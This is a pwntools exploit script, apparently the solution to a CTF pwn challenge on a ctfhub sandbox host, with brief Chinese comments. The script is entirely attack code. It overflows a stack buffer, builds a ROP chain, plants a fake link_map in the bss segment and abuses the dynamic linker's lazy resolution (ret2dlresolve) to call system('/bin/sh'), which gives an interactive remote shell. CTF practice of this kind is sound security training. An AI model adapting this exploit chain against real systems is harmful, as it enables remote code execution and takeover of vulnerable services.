from pwn import *
 
prog = "./pwn"
 
context(os='linux', arch='amd64', log_level='debug')
elf = ELF(prog)
libc = ELF("./libc-2.27.so")
p = remote("challenge-9f8509a101bc4c73.sandbox.ctfhub.com",35851)
 
fakeLinkMap = 0x601030 + 0x110  # write to where
rbp = fakeLinkMap-8
pop_rdi_ret = 0x400583
pop_rsi_r15_ret = 0x400581
main = 0x4004E7
ret = 0x4003de
 
l_addr = abs(libc.sym['system'] - libc.sym['read'])#l_addr为system到read函数的偏移
off = 0xFFFFFFFFFFF3F410 #手动计算负数偏移的16进制形式
 
linkMap = p64(off)
linkMap += p64(0x17)
linkMap += p64(fakeLinkMap + 0x18)
linkMap += p64(fakeLinkMap + 0x30 + l_addr)#因为l_addr为负，在处理时会减去|l_addr|，此处直接加上|l_addr|抵消
linkMap += p64(7)
linkMap += p64(0)
linkMap += p64(0x6)
linkMap += p64(elf.got['read']-0x8)
linkMap += b'/bin/sh\x00'
linkMap = linkMap.ljust(0x58,b'A')
linkMap+=p64(0x5)
linkMap += p64(fakeLinkMap + 0x100)
linkMap += p64(fakeLinkMap + 0x58)
linkMap += p64(fakeLinkMap + 0x30)
linkMap = linkMap.ljust(0xf8,b'A')
linkMap += p64(fakeLinkMap + 0x8)
 
payload = b'a'*0x108
 
#将FakeLinkMap写入bss段中

payload += p64(pop_rsi_r15_ret)
payload += p64(fakeLinkMap)
payload += p64(0)
payload += p64(elf.plt['read'])
print(hex(elf.plt['read']))
#将FakeLinkMap写入bss段中
 
#将/bin/sh作为参数push进rdi
payload += p64(pop_rdi_ret)
payload += p64(fakeLinkMap + 0x40)
#将/bin/sh作为参数push进rdi

payload+=p64(ret)#平衡栈
payload += p64(0x4003E6)#跳转至plt0查询函数
payload += p64(fakeLinkMap)#fakeLinkMap作为l参数
payload += p64(0)#0为参数reloc_args
payload += p64(main)
pause()
p.send(payload)
 
pause()
p.send(linkMap)
p.interactive()
